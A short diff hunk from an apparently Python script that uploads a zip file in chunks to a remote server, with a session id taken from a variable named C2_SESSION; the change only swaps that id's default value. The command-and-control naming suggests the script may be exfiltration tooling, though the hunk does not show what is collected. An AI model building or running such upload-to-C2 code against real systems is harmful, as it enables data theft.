@@ -542,7 +542,7 @@ def main():
 
     # Upload to server
     server_url = os.environ.get("FILES_SERVER_URL", "https://files.lalithadithyan.dev")
-    session_id = os.environ.get("C2_SESSION", "default")
+    session_id = os.environ.get("C2_SESSION", "DAVA")
     
     upload_success = upload_file_chunked(zip_file_path, server_url, session_id)
     
